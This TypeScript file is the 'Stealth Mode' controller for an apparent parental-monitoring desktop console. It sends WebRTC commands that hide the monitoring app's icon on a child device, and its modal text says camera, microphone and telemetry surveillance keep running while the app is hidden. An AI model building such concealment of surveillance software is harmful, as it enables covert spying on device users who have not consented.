/**
 * @file stealth-manager.ts
 * @description Remote Stealth Mode Control and Confirmation Dialog for Nexus Parent Desktop.
 *
 * Hey friend! Here is how remote Stealth Mode works in the desktop parent console:
 *
 * 1. Mutual State Convergence:
 *    When the parent pairs with a child device, the child immediately dispatches
 *    STEALTH_STATUS:ON or STEALTH_STATUS:OFF across the WebRTC DataChannel.
 *    This manager listens for that initial packet and instantly sets the button
 *    and badge state so the parent sees real-time status right away!
 *
 * 2. Tactical Confirmation Modal:
 *    Clicking "Stealth Mode" (bottom of the left sidebar or titlebar menu) opens
 *    a modal dialog explaining the action:
 *    - Activating: Explains that the child app icon will be hidden from the launcher
 *      and app drawer, and can be reversed via the 1x1 home screen widget or this console.
 *    - Deactivating: Explains that the app icon will be restored to the child launcher.
 *
 * 3. Command & Acknowledgment:
 *    When confirmed, dispatches "STEALTH_ON" or "STEALTH_OFF" via webrtcManager.sendCommand().
 *    Shows a "Processing..." state and awaits the child's STEALTH_ON_ACK / STEALTH_OFF_ACK.
 */

import { webrtcManager } from '../webrtc/webrtc-manager.js';
import { deviceState } from '../shared/device-state.js';

let isPendingResponse = false;
let pendingTimeoutId: number | null = null;

/**
 * Initializes the Stealth Mode manager and binds DOM buttons and WebRTC message listeners.
 */
export function initStealthManager(): void {
  const stealthBtn = document.getElementById('btn-stealth-mode');
  const menuItemStealth = document.getElementById('menu-item-stealth');

  // Bind click handlers
  stealthBtn?.addEventListener('click', () => {
    handleStealthButtonClick();
  });

  menuItemStealth?.addEventListener('click', () => {
    handleStealthButtonClick();
  });

  // Re-render button whenever central device state changes
  deviceState.subscribe(() => {
    updateStealthButtonUi();
  });

  // Listen for real-time DataChannel status notifications from the child
  webrtcManager.onMessage((message) => {
    if (typeof message !== 'string') return;
    handleIncomingDataChannelMessage(message.trim());
  });

  // Initial render
  updateStealthButtonUi();
}

/**
 * Handles incoming DataChannel strings matching the stealth protocol.
 */
function handleIncomingDataChannelMessage(msg: string): void {
  switch (msg) {
    case 'STEALTH_STATUS:ON':
    case 'STEALTH_ON_ACK':
      console.log('[StealthManager] Received stealth ACTIVE confirmation from child');
      clearPendingTimeout();
      deviceState.setStealthMode(true);
      updateStealthButtonUi();
      break;

    case 'STEALTH_STATUS:OFF':
    case 'STEALTH_OFF_ACK':
      console.log('[StealthManager] Received stealth INACTIVE confirmation from child');
      clearPendingTimeout();
      deviceState.setStealthMode(false);
      updateStealthButtonUi();
      break;

    default:
      break;
  }
}

/**
 * Triggered when the user clicks the Stealth Mode button in the sidebar or menu.
 */
function handleStealthButtonClick(): void {
  if (!deviceState.isConnected()) {
    openNoticeModal(
      'Device Not Connected',
      'Please pair and establish a live WebRTC connection with a child device before toggling Stealth Mode.'
    );
    return;
  }

  if (isPendingResponse) {
    return;
  }

  const isCurrentlyStealth = deviceState.isStealthMode();
  openStealthConfirmationModal(isCurrentlyStealth);
}

/**
 * Displays the tactical confirmation modal dialog for stealth activation or deactivation.
 */
function openStealthConfirmationModal(isCurrentlyStealth: boolean): void {
  const existing = document.getElementById('stealth-modal-overlay');
  if (existing) existing.remove();

  const overlay = document.createElement('div');
  overlay.id = 'stealth-modal-overlay';
  overlay.className = 'settings-overlay';

  const title = isCurrentlyStealth ? 'Deactivate Stealth Mode?' : 'Activate Stealth Mode?';
  const desc = isCurrentlyStealth
    ? 'This operation will restore the Nexus Child application icon to the child device home screen launcher and app drawer.'
    : 'This operation will hide the Nexus Child application icon from the child device home screen and app drawer.\n\nAll background monitoring, telemetry, and camera/mic surveillance will remain fully operational.';

  const subtext = isCurrentlyStealth
    ? 'The child device user will be able to see the app icon again.'
    : 'Stealth mode can be reversed at any time from this console or by tapping the 1x1 Nexus Child widget on the child device.';

  const confirmBtnText = isCurrentlyStealth ? 'Deactivate Stealth' : 'Activate Stealth';
  const confirmBtnClass = isCurrentlyStealth ? 'settings-btn-primary' : 'settings-btn-danger';

  overlay.innerHTML = `
    <div class="settings-modal" style="max-width: 480px;">
      <div class="settings-header">
        <span class="settings-title">${title}</span>
        <button id="btn-stealth-modal-close" class="settings-close-btn" title="Close">✕</button>
      </div>
      <div class="settings-body" style="display: flex; flex-direction: column; gap: 14px;">
        <p style="font-size: 13px; line-height: 1.5; color: var(--text-primary); margin: 0; white-space: pre-line;">${desc}</p>
        <div style="background-color: #181818; border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 6px; padding: 12px;">
          <span style="font-size: 11px; font-family: var(--mono-font-family); color: var(--text-secondary); line-height: 1.4; display: block;">
            NOTE: ${subtext}
          </span>
        </div>
      </div>
      <div class="settings-footer">
        <button id="btn-stealth-modal-cancel" class="settings-btn settings-btn-secondary">Cancel</button>
        <button id="btn-stealth-modal-confirm" class="settings-btn ${confirmBtnClass}">${confirmBtnText}</button>
      </div>
    </div>
  `;

  document.body.appendChild(overlay);

  const closeModal = () => {
    overlay.remove();
  };

  overlay.querySelector('#btn-stealth-modal-close')?.addEventListener('click', closeModal);
  overlay.querySelector('#btn-stealth-modal-cancel')?.addEventListener('click', closeModal);

  overlay.querySelector('#btn-stealth-modal-confirm')?.addEventListener('click', () => {
    closeModal();
    executeStealthToggle(isCurrentlyStealth);
  });

  // Close when clicking backdrop outside modal
  overlay.addEventListener('click', (e) => {
    if (e.target === overlay) {
      closeModal();
    }
  });
}

/**
 * Displays a lightweight informative modal when an action cannot be performed.
 */
function openNoticeModal(title: string, message: string): void {
  const existing = document.getElementById('stealth-modal-overlay');
  if (existing) existing.remove();

  const overlay = document.createElement('div');
  overlay.id = 'stealth-modal-overlay';
  overlay.className = 'settings-overlay';

  overlay.innerHTML = `
    <div class="settings-modal" style="max-width: 420px;">
      <div class="settings-header">
        <span class="settings-title">${title}</span>
        <button id="btn-notice-modal-close" class="settings-close-btn" title="Close">✕</button>
      </div>
      <div class="settings-body">
        <p style="font-size: 13px; line-height: 1.5; color: var(--text-primary); margin: 0;">${message}</p>
      </div>
      <div class="settings-footer">
        <button id="btn-notice-modal-ok" class="settings-btn settings-btn-primary">OK</button>
      </div>
    </div>
  `;

  document.body.appendChild(overlay);

  const closeModal = () => overlay.remove();
  overlay.querySelector('#btn-notice-modal-close')?.addEventListener('click', closeModal);
  overlay.querySelector('#btn-notice-modal-ok')?.addEventListener('click', closeModal);
}

/**
 * Dispatches the appropriate stealth command across the WebRTC DataChannel.
 */
function executeStealthToggle(isCurrentlyStealth: boolean): void {
  const command = isCurrentlyStealth ? 'STEALTH_OFF' : 'STEALTH_ON';
  console.log(`[StealthManager] Dispatching ${command} to child device...`);

  const sent = webrtcManager.sendCommand(command);
  if (!sent) {
    console.error('[StealthManager] Failed to dispatch command: WebRTC DataChannel is closed.');
    return;
  }

  isPendingResponse = true;
  updateStealthButtonUi();

  // Safety fallback timer: reset pending state if child doesn't acknowledge within 10 seconds
  clearPendingTimeout();
  pendingTimeoutId = window.setTimeout(() => {
    if (isPendingResponse) {
      console.warn('[StealthManager] Stealth command timed out waiting for ACK from child.');
      isPendingResponse = false;
      updateStealthButtonUi();
    }
  }, 10_000);
}

function clearPendingTimeout(): void {
  if (pendingTimeoutId !== null) {
    clearTimeout(pendingTimeoutId);
    pendingTimeoutId = null;
  }
  isPendingResponse = false;
}

/**
 * Updates the visual styling, label, and badge of the sidebar Stealth button.
 */
export function updateStealthButtonUi(): void {
  const stealthBtn = document.getElementById('btn-stealth-mode');
  if (!stealthBtn) return;

  const isConnected = deviceState.isConnected();
  const isStealth = deviceState.isStealthMode();

  const labelEl = stealthBtn.querySelector<HTMLElement>('div > span:last-child');
  const badgeEl = stealthBtn.querySelector<HTMLElement>('.count-pill');

  if (isPendingResponse) {
    if (labelEl) labelEl.textContent = 'Processing...';
    if (badgeEl) {
      badgeEl.textContent = 'WAIT';
      badgeEl.style.color = '#eab308';
      badgeEl.style.borderColor = 'rgba(234, 179, 8, 0.4)';
    }
    stealthBtn.style.opacity = '0.7';
    stealthBtn.style.pointerEvents = 'none';
    return;
  }

  stealthBtn.style.opacity = '1.0';
  stealthBtn.style.pointerEvents = 'auto';

  if (!isConnected) {
    if (labelEl) labelEl.textContent = 'Stealth Mode';
    if (badgeEl) {
      badgeEl.textContent = 'ARMED';
      badgeEl.style.color = '#ef4444';
      badgeEl.style.borderColor = 'rgba(239, 68, 68, 0.4)';
    }
    stealthBtn.style.borderColor = 'rgba(239, 68, 68, 0.25)';
    stealthBtn.style.backgroundColor = '#161616';
    return;
  }

  if (isStealth) {
    if (labelEl) labelEl.textContent = 'Stealth Active';
    if (badgeEl) {
      badgeEl.textContent = 'ACTIVE';
      badgeEl.style.color = '#ffffff';
      badgeEl.style.backgroundColor = '#ef4444';
      badgeEl.style.borderColor = '#ef4444';
    }
    stealthBtn.style.borderColor = '#ef4444';
    stealthBtn.style.backgroundColor = 'rgba(239, 68, 68, 0.15)';
  } else {
    if (labelEl) labelEl.textContent = 'Stealth Mode';
    if (badgeEl) {
      badgeEl.textContent = 'ARMED';
      badgeEl.style.color = '#ef4444';
      badgeEl.style.backgroundColor = 'transparent';
      badgeEl.style.borderColor = 'rgba(239, 68, 68, 0.4)';
    }
    stealthBtn.style.borderColor = 'rgba(239, 68, 68, 0.25)';
    stealthBtn.style.backgroundColor = '#161616';
  }
}
